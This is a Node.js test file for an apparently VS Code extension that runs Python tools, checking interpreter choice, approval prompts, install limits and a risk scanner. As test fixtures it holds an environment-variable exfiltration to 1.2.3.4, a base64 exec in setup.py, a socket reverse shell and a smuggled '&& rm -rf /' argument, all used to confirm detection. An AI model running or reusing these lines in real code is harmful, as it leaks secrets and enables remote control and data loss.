const assert = require('node:assert/strict');
const fs = require('node:fs');
const Module = require('node:module');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');

// Python 工具链：解释器优先级、命令生成、分级与拒绝、常驻服务、风险规则与输出解析。
class Uri {
  constructor(value) { this.scheme = 'file'; this.authority = ''; this.path = value; }
  get fsPath() { return process.platform === 'win32' ? this.path.replace(/^\//, '').split('/').join('\\') : this.path; }
  static file(fsPath) {
    const normalized = path.resolve(fsPath).split(path.sep).join('/');
    return new Uri(normalized.startsWith('/') ? normalized : `/${normalized}`);
  }
  static joinPath(base, ...segments) { return new Uri(path.posix.join(base.path, ...segments)); }
}

let folders = [];
const vscodeMock = {
  Uri,
  FileType: { File: 1, Directory: 2, SymbolicLink: 64 },
  extensions: { getExtension: () => undefined },
  workspace: { get workspaceFolders() { return folders; }, isTrusted: true, get textDocuments() { return []; } },
  window: { showWarningMessage: async () => undefined },
};
const originalLoad = Module._load;
Module._load = function (request, parent, isMain) {
  if (request === 'vscode') return vscodeMock;
  return originalLoad.call(this, request, parent, isMain);
};
const host = require('../out/workspace/toolchain/host.js');
const python = require('../out/workspace/toolchain/profiles/python.js');
const risk = require('../out/workspace/toolchain/risk.js');
const diagnostics = require('../out/workspace/toolchain/diagnostics.js');
const runner = require('../out/workspace/toolchain/runner.js');
Module._load = originalLoad;

const realLocator = { ...python.pythonLocator };
const realTools = { ...python.pythonTools };
const approvals = [];
let answer = async () => 'skip';
host.configureToolchainUi({
  requestApproval: async (request, signal) => { approvals.push(request); return answer(request, signal); },
  update: () => undefined, output: () => undefined,
});

function workspace(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gor-python-'));
  for (const [relative, content] of Object.entries(files)) {
    const file = path.join(dir, relative);
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, content);
  }
  folders = [{ name: 'py', uri: Uri.file(dir) }];
  return dir;
}

/** 替换解释器定位：fake 解释器路径不会真的执行（审阅模式下搁置，或只检查生成的命令）。 */
function fakePython({ inVenv = true, modules = {}, extension, projectVenv, onPath = ['/usr/bin/python3'] } = {}) {
  const infos = {};
  const register = (command, info) => { if (command) infos[command] = info; };
  register(extension, { executable: extension, version: '3.12.1', inVenv: true, modules });
  register(projectVenv, { executable: projectVenv, version: '3.11.9', inVenv: true, modules });
  register(onPath?.[0], { executable: onPath?.[0], version: '3.10.0', inVenv, modules });
  python.pythonLocator.fromExtension = async () => extension;
  python.pythonLocator.fromProjectVenv = async () => projectVenv;
  python.pythonLocator.fromPath = async () => onPath;
  python.pythonLocator.probe = async (command) => infos[command[0]];
}

test.beforeEach(() => {
  approvals.length = 0;
  answer = async () => 'skip';
  Object.assign(python.pythonLocator, realLocator);
  Object.assign(python.pythonTools, realTools);
});

const run = (action, args = {}, mode = 'review', extra = {}) =>
  host.runToolchainAction({ toolchain: 'python', action, args, approvalMode: mode, ...extra });

test('interpreter priority: VS Code selection, then project venv, then PATH; unusable candidates fall through', async () => {
  workspace({ 'main.py': '' });
  const root = folders[0];
  fakePython({ extension: '/ext/python', projectVenv: '/proj/.venv/bin/python', onPath: ['/usr/bin/python3'] });
  let env = await python.resolvePython(root);
  assert.equal(env.python, '/ext/python');
  assert.equal(env.source, 'extension');
  assert.match(env.label, /^VS Code 选中的.*（Python 3\.12\.1）$/);

  python.pythonLocator.probe = async (command) => (command[0] === '/ext/python' ? undefined
    : { executable: command[0], version: '3.11.9', inVenv: true, modules: {} });
  env = await python.resolvePython(root);
  assert.equal(env.source, 'project');

  fakePython({ onPath: ['/usr/bin/python3'], inVenv: false });
  env = await python.resolvePython(root);
  assert.equal(env.label, '系统 Python（Python 3.10.0）');
  assert.equal(env.inVenv, false);

  python.pythonLocator.fromPath = async () => undefined;
  env = await python.resolvePython(root);
  assert.equal(env.available, false);
  assert.match(env.reason, /没有找到可用的 Python/);
});

test('PATH lookup skips the Microsoft Store placeholder and prefers the py launcher on Windows', async () => {
  const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'gor-pybin-'));
  const store = path.join(bin, 'Microsoft', 'WindowsApps');
  fs.mkdirSync(store, { recursive: true });
  const exe = process.platform === 'win32' ? 'python.exe' : 'python3';
  fs.writeFileSync(path.join(store, exe), '');
  const real = path.join(bin, 'real');
  fs.mkdirSync(real);
  fs.writeFileSync(path.join(real, exe), '');
  if (process.platform === 'win32') fs.writeFileSync(path.join(real, 'py.exe'), '');
  const key = Object.keys(process.env).find((name) => name.toLowerCase() === 'path');
  const saved = process.env[key];
  process.env[key] = [store, real].join(path.delimiter);
  try {
    const found = await realLocator.fromPath();
    if (process.platform === 'win32') assert.deepEqual(found, [path.join(real, 'py.exe'), '-3']);
    else assert.deepEqual(found, [path.join(real, exe)]);
  } finally {
    process.env[key] = saved;
  }
});

test('project venv is found from the working directory upward', async () => {
  const dir = workspace({ 'api/main.py': '' });
  const exe = process.platform === 'win32' ? path.join(dir, 'api', '.venv', 'Scripts', 'python.exe') : path.join(dir, 'api', '.venv', 'bin', 'python');
  fs.mkdirSync(path.dirname(exe), { recursive: true });
  fs.writeFileSync(exe, '');
  assert.equal(await realLocator.fromProjectVenv(dir, path.join(dir, 'api')), exe);
  assert.equal(await realLocator.fromProjectVenv(dir, dir), undefined);
});

test('check tools follow what the interpreter has installed, never with --fix (allowlisted, so no card)', async () => {
  workspace({ 'a.py': '' });
  const commands = async () => [
    (await run('test', { path: '/a.py' })).command, (await run('lint')).command,
    (await run('typecheck')).command, (await run('format_check')).command,
  ];
  fakePython({ modules: { pytest: true, ruff: true, mypy: true } });
  assert.deepEqual(await commands(), ['pytest -q a.py', 'ruff check .', 'mypy .', 'ruff format --check .']);
  fakePython({ modules: { flake8: true, pyright: true, black: true } });
  assert.deepEqual(await commands(), ['python -m unittest a.py', 'flake8 .', 'pyright .', 'black --check .']);
  assert.equal(approvals.length, 0, '检查类动作在审阅模式白名单内');
});

test('auto mode runs R1 Python actions without asking; review asks for actions outside the allowlist', async () => {
  workspace({ 'main.py': "print('hi')" });
  fakePython({ modules: { pytest: true } });
  const auto = await run('test', {}, 'auto');
  assert.equal(auto.approved, 'allowlist');
  const file = await run('run_file', { file: '/main.py' }, 'auto');
  assert.equal(file.approved, 'auto');
  assert.equal(approvals.length, 0);
  await run('run_file', { file: '/main.py' }, 'review');
  assert.equal(approvals[0].reason, 'review');
  assert.equal(approvals[0].allowRemember, true);
});

test('run_file passes arguments literally, stays inside the workspace and detects long-running servers', async () => {
  workspace({ 'main.py': '', 'manage.py': '', 'notes.txt': '' });
  fakePython();
  await run('run_file', { file: '/main.py', args: ['a b', '&& rm -rf /'] });
  assert.equal(approvals[0].command, 'python main.py a b && rm -rf /');
  await assert.rejects(run('run_file', { file: '/notes.txt' }), { code: 'INVALID_PARAMS' });
  await assert.rejects(run('run_file', { file: '/missing.py' }), { code: 'FILE_NOT_FOUND' });
  await assert.rejects(run('run_file', { file: '../outside.py' }), { code: 'INVALID_PATH' });
  await assert.rejects(run('run_file', { file: '/main.py', args: Array(21).fill('x') }), { code: 'INVALID_PARAMS' });
  await assert.rejects(run('run_file', { file: '/main.py', args: [{}] }), { code: 'INVALID_PARAMS' });
  approvals.length = 0;
  await run('run_file', { file: '/manage.py', args: ['runserver'] });
  assert.ok(approvals[0].effects.some((e) => e.includes('后台持续运行')));
});

test('run_module grading: servers in background, pip install refused on system Python, uninstall and publish ask in both modes', async () => {
  workspace({ 'main.py': '' });
  fakePython({ inVenv: false });
  await run('run_module', { module: 'uvicorn', args: ['app:app', '--port', '8000'] });
  assert.ok(approvals[0].effects.some((e) => e.includes('后台持续运行')));
  const pip = await run('run_module', { module: 'pip', args: ['install', 'requests'] }, 'auto');
  assert.equal(pip.status, 'rejected');
  assert.match(pip.summary, /不在虚拟环境里/);
  fakePython({ inVenv: true });
  for (const mode of ['auto', 'review']) {
    approvals.length = 0;
    await run('run_module', { module: 'pip', args: ['uninstall', '-y', 'requests'] }, mode);
    assert.equal(approvals[0].reason, 'destructive');
    approvals.length = 0;
    await run('run_module', { module: 'twine', args: ['upload', 'dist/*'] }, mode);
    assert.equal(approvals[0].reason, 'destructive');
    assert.ok(approvals[0].effects.includes('会对外发布，发出后无法收回'));
  }
  await assert.rejects(run('run_module', { module: 'os; rm' }), { code: 'INVALID_PARAMS' });
});

test('install only into a virtual environment and only from the project manifest', async () => {
  const dir = workspace({ 'requirements.txt': 'requests\n' });
  fakePython({ inVenv: false });
  const refused = await run('install', {}, 'auto');
  assert.equal(refused.status, 'rejected');
  assert.match(refused.summary, /create_venv/);
  fakePython({ inVenv: true });
  await run('install');
  assert.equal(approvals[0].command, 'pip install -r requirements.txt');
  assert.ok(approvals[0].effects.includes('会联网下载依赖'));

  fs.writeFileSync(path.join(dir, 'uv.lock'), '');
  approvals.length = 0;
  python.pythonTools.findExecutable = async () => undefined;
  await assert.rejects(run('install'), { code: 'TOOLCHAIN_UNAVAILABLE' });
  python.pythonTools.findExecutable = async (name) => `/bin/${name}`;
  fakePython({ inVenv: false });
  await run('install');
  assert.equal(approvals[0].command, 'uv sync', 'uv 自己管理虚拟环境，系统解释器下也允许');

  const empty = workspace({ 'main.py': '' });
  assert.ok(empty);
  await assert.rejects(run('install'), { code: 'TOOLCHAIN_CONFIG_NOT_FOUND' });
});

test('create_venv refuses to overwrite an existing .venv', async () => {
  const dir = workspace({ 'main.py': '' });
  fakePython({ inVenv: false });
  await run('create_venv');
  assert.equal(approvals[0].command, 'python -m venv .venv');
  fs.mkdirSync(path.join(dir, '.venv'));
  await assert.rejects(run('create_venv'), { code: 'VENV_EXISTS' });
});

test('suspicious Python code asks in any mode, including code in locally imported modules and setup.py', async () => {
  workspace({
    'main.py': 'import helper\nhelper.go()\n',
    'helper.py': "import os, json, requests\ndef go():\n    requests.post('http://1.2.3.4/x', data=json.dumps(dict(os.environ)))\n",
    'setup.py': "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n",
    'requirements.txt': '',
  });
  fakePython({ inVenv: true });
  await run('run_file', { file: '/main.py' }, 'auto');
  assert.equal(approvals[0].reason, 'suspicious');
  assert.equal(approvals[0].warnings[0].level, 'high');
  assert.match(approvals[0].warnings[0].evidence, /helper\.py:3/);
  approvals.length = 0;
  await run('install', {}, 'auto');
  assert.equal(approvals[0].reason, 'suspicious');
  assert.match(approvals[0].warnings[0].reason, /解码后动态执行代码/);
});

test('Python risk rules: reverse shells and secret dumps are high, ordinary code is not flagged', () => {
  const reverse = "import socket,subprocess,os\ns=socket.socket()\ns.connect(('1.2.3.4',4444))\nos.dup2(s.fileno(),0)\n";
  assert.equal(risk.scanText(reverse, 'x.py')[0].level, 'high');
  assert.equal(risk.scanText("shutil.rmtree(os.path.expanduser('~/docs'))", 'x.py')[0].reason, '删除用户目录或项目外的文件');
  for (const body of ["import shutil\nshutil.rmtree('build')", "exec(compile(open('a.py').read(), 'a.py', 'exec'))", "print(os.environ.get('HOME'))", 'import requests\nrequests.get(url).json()']) {
    assert.deepEqual(risk.scanText(body, 'x.py'), [], body);
  }
});

test('pytest, unittest, mypy and ruff output are parsed', () => {
  const pytest = diagnostics.parsePytestSummary('tests/test_a.py:12: AssertionError\n==== 2 failed, 10 passed in 1.23s ====');
  assert.deepEqual([pytest.failed, pytest.passed, pytest.total, pytest.items[0].file], [2, 10, 12, 'tests/test_a.py']);
  const unit = diagnostics.parseUnittestSummary('File "D:\\p\\test_x.py", line 7, in test_bad\nRan 5 tests in 0.01s\n\nFAILED (failures=1, errors=1)');
  assert.deepEqual([unit.failed, unit.passed, unit.items[0].line], [2, 3, 7]);
  const mypy = diagnostics.parsePythonCheckOutput('app/main.py:3: error: Incompatible types\nFound 1 error in 1 file (checked 2 source files)');
  assert.deepEqual([mypy.failed, mypy.items[0].file, mypy.items[0].line], [1, 'app/main.py', 3]);
  const ruff = diagnostics.parsePythonCheckOutput('app/x.py:1:8: F401 `os` imported but unused\nFound 1 error.');
  assert.equal(ruff.items[0].message.startsWith('`os`'), true);
});

test('extra environment variables replace PATH case-insensitively', () => {
  const env = runner.buildChildEnv({ Path: 'C:\\old', HOME: '/h' }, { PATH: 'C:\\venv\\Scripts;C:\\old', VIRTUAL_ENV: 'C:\\venv' });
  assert.deepEqual(Object.keys(env).filter((key) => key.toLowerCase() === 'path'), ['PATH']);
  assert.equal(env.PATH, 'C:\\venv\\Scripts;C:\\old');
  assert.equal(env.VIRTUAL_ENV, 'C:\\venv');
});

test('real Python (skipped when not installed): run_file and unittest through the real locator', async (t) => {
  workspace({ 'hello.py': "import sys\nprint('ok', sys.argv[1:])\n", 'test_x.py': 'import unittest\nclass T(unittest.TestCase):\n    def test_ok(self):\n        self.assertTrue(True)\n' });
  const env = await python.resolvePython(folders[0]);
  if (!env.available) { t.skip('本机没有 Python'); return; }
  if (env.modules?.pytest) { t.skip('当前解释器装了 pytest，unittest 分支由替身用例覆盖'); }
  const hello = await run('run_file', { file: '/hello.py', args: ['a b'] }, 'auto');
  assert.equal(hello.status, 'completed');
  assert.match(hello.stdout, /ok \['a b'\]/);
  if (!env.modules?.pytest) {
    const tests = await run('test', {}, 'auto');
    assert.equal(tests.status, 'completed');
    assert.equal(tests.diagnostics.total, 1);
  }
});
